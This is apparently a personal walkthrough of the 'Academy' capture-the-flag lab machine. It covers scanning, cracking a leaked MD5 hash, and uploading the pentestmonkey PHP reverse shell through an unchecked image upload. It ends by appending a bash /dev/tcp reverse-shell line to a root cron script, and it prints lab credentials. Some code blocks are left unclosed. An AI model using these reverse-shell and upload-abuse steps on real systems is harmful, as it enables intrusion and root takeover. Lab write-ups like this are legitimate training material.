# Academy

```jsx
password is => root:tcm
then you can use ip a to check the ip
```

The first step is to discover the IP address which is 172.16.2.129 in my case.

# Scanning and Enumeration:

1) Starting off with the nmap scan

```jsx
nmap -t$ -p- -A 172.16.2.129

<aside>
ðŸ’¡ In major cases, port 22 is a dead end, although in pentest cases, we have to scan it in order to see if the client can detect us,so based on that, we have two opportunities here.
1) FTP 
2) HTTP

Hello Heath !
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere, he will change it ASAP.

I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

The StudentRegno number is what you use for login.

Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
We can always adapt it to our needs.

-jdelta
```

<aside>
ðŸ’¡ If the note.txt was in the webserver, we could have uploaded our malware and executed it on the web, but since it isnt, we have to try some other way.

</aside>

<aside>
ðŸ’¡ Lets try to identify the hash format for the password.

</aside>

![Untitled](walkthrough_resources/Untitled%201.png)

<aside>
ðŸ’¡ After determining it as being an MD5 hash, lets try to break it.

</aside>

```jsx
//save it in a hashes file
â”Œâ”€â”€(rootã‰¿wahaj)-[/home/wahaj]
â””â”€# mousepad hashes               
                                                                                                                                                              
â”Œâ”€â”€(rootã‰¿wahaj)-[/home/wahaj]
â””â”€# hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt
```

<aside>
ðŸ’¡ And we have a hit, password discoverd

</aside>

![Untitled](walkthrough_resources/Untitled%202.png)

<aside>
ðŸ’¡ Now, we have to do something with the credentials, potentially on a website, lets enumerate that

</aside>

Running dirbuster for enumration. And we get a result where there is a path /acdemy lets check it out.

![Untitled](walkthrough_resources/Untitled%203.png)

<aside>
ðŸ’¡ credentialsâ‡’ 10201321:student (based on the note)

</aside>

and we have access.

![Untitled](walkthrough_resources/Untitled%204.png)

In My profile section,

![Untitled](walkthrough_resources/Untitled%205.png)

we can simply, click on the no image and open in  new tab to see where its stored.

<aside>
ðŸ’¡ [**http://172.16.2.129/academy/studentphoto/noimage.png**](http://172.16.2.129/academy/studentphoto/noimage.png)

</aside>

Also, if we upload a file that is not an image, it saves it, which means we can actually upload malicious code here.

Since, we know that the system is running on PHP, lets try a PHP malware.

<aside>
ðŸ’¡ You can get the code from
[https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
and then change the ip to your ip.

</aside>

set up a listener

```jsx
â”Œâ”€â”€(rootã‰¿wahaj)-[/home/wahaj/Desktop]
â””â”€# nc -lvp 1234    
listening on [any] 1234 ...
```

Now upload the shell code and watch the magic.

```jsx
**â”Œâ”€â”€(rootã‰¿wahaj)-[/home/wahaj/Desktop]
â””â”€# nc -lvp 1234

It is indeed a script running timely.

<aside>
ðŸ’¡ Time to get a reverse shell in the backup script.

</aside>

```jsx
nano backup.sh
//paste this in the script and hits save
bash -i >& /dev/tcp/192.168.1.107/8080 0>&1
nc -lvp 8080

Since the script is running with root privileges, we will get a root shell.
```

<aside>
ðŸ’¡ Now the moment, the script is executed, we will get a root shell
